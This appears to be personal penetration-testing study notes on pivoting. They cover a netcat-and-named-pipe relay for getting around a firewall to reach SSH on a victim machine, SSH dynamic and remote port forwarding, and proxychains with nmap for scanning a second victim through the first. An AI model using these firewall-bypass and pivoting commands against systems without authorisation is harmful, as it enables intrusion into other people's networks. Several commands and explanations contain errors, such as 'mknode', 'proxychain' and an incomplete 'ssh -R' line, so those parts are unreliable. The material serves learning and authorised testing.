### Bypass Firewalls with Forward Relays:

**Victim Machine**:
- Lets say if the victim blocks attacker's packets to port 22.
- `sudo iptables -A INPUT -s <attacker-ip> -p tcp --dport 22 -j DROP`
- Now attacker won't be able to connect to victim machine through port 22 (ssh).

To bypass this, in the victim machine open a different port and forward those packets to port 22. Which made it looks like it's coming from localhost.
- `nc -nvlp 6969 | nc -nv 127.0.0.1 22` --> don't run
- all packets coming to port 6969 will be sent to port 22.
- Also for receiving the output we might need a named pipe.
	`mknode pipe1 p` --> created a new pipe
- `nc -nvlp 6969 <pipe1 | nc -nv 127.0.0.1 22 > pipe1`
- When there is data in pipe1, it will be sent to machine connected to port 6969. 

**Attacker**:
- `ssh kali@<victim-ip> -p 6969`
- Gets ssh connection.

**Flow of execution**:
-  `nc -nvlp 6969 <pipe1 | nc -nv 127.0.0.1 22 > pipe1`
1. First the attacker send commands through ssh to port 6969.
2. victim's nc will read the **pipe1**. If it has content, then it will send it to attacker machine else nothing.
3. Now the commands received by port 6969 is sent to port 22.
4. The output of the command will be saved in a named_pipe called **pipe1**.
5. Again step 2 will check pipe1 and print it in attacker machine.
The pipe1 is used to send attacker input to ssh server and ssh server's output to attacker machine.

### SSH Tunneling, SOCKS & Proxychains

SSH Tunneling means creating a tunnel between attacker machine and victim-2.

**SOCKS**:
- Stands for Secure Socket.
- v4 and v5. Where v5 is very secure and v4 is unauthenticated.

**Types of Port Forwarding**:
1. Local Port Forwarding:
   - You can forward one port of attacker machine to another port of victim machine. Initiated by attacker.
2. Dynamic Port Forwarding:
   - You can forward one port of attacker machine to any port of victim machine. But only applies to TCP port.
3. Remote Port Forwarding:
   - Here the victim1 will make a connection to attacker. And get data from victim2 and send to attacker. Initiated by victim-1.



#### Dynamic port fwd:
**Attacker Machine**:
`sudo nano /etc/proxychains4.conf`
Use strict chain.
`socks4 127.0.0.1 9050` add this line at end.

`ssh -D 9050 user@<victim-1-ip>`
you will be logged in. 
All the traffic sent to any machine using SOCKS proxy will be sent via victim-1 machine.

**Accessing port 80 of victim 2 via browser**:
- Go to firefox and configure socks proxy.
- Set ip as 127.0.0.1 and port as 9050.
- Now you can access victim-2 machine's web server.
- Because the traffic will be sent via victim1.

**Using proxychain to do nmap scan**:
- You can scan victim-2 using proxychain, as we already configured it.
- `proxychain nmap -p21 <victim-2-ip>`.

**Remote Forwarding**:
`ssh -R <victim-1-ip>:6666:127.0.0.1:1234`
All traffic sent to victim-1 machine port 6666 will be forwarded to our machine 1234 port.
